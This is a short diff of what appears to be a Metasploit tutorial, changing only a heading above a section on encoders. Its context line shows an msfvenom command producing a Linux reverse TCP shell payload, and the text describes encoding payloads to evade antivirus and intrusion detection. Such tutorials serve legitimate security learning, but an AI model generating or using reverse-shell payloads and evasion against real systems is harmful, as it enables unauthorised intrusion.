@@ -353,7 +353,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex
 
 
 ---
-### **Encoders in Metasploit**
+# **Encoders in Metasploit**
 
 Encoders in Metasploit are used to obfuscate payloads to bypass detection mechanisms, such as antivirus software and intrusion detection systems (IDS). Encoding helps avoid detection by reformatting the payload without altering its functionality.
 
